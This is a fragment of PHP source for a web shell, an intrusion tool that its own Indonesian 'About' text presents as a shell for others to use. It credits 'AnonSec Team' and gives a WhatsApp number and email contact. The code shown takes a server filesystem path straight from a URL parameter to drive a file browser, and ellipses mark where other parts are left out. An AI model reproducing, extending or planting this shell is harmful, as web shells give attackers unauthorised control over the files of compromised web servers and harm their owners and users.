	...
	<div class="container">
		<div class="card text-dark">
			<div class="card-header">
				<a href="?"><h4>HOME <i class="fa fa-globe"></i> 403</h4></a>';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
...
<div class="container">
	<div class="card text-dark">
		<div class="card-header">';
echo "<b>- About -</b><br />";
echo "Thanks bre dah pake shell nya, jika ada yang error silahkan contact email di bawah<br />Greetz : <a href=''>{ AnonSec Team } - And You</a><br />Dancok: <a href='https://wa.me/6283849505589'>tukanghek@protonmail.com</a>";
	echo '</div>
	</div>
</div>';
}
